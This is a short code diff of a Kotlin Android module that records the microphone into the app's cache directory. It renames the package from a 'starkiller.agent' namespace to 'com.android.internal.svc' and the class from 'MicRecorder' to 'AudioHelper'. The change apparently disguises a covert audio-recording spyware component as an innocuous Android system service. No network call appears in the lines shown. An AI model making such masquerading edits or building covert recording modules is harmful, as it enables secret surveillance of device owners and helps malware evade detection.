@@ -1,4 +1,4 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.content.Context
 import android.media.MediaRecorder
@@ -7,7 +7,7 @@ import android.util.Base64
 import org.json.JSONObject
 import java.io.File
 
-class MicRecorder(private val context: Context) {
+class AudioHelper(private val context: Context) {
 
     fun record(durationSec: Int): JSONObject {
         val outFile = File(context.cacheDir, "mic_${System.currentTimeMillis()}.3gp")
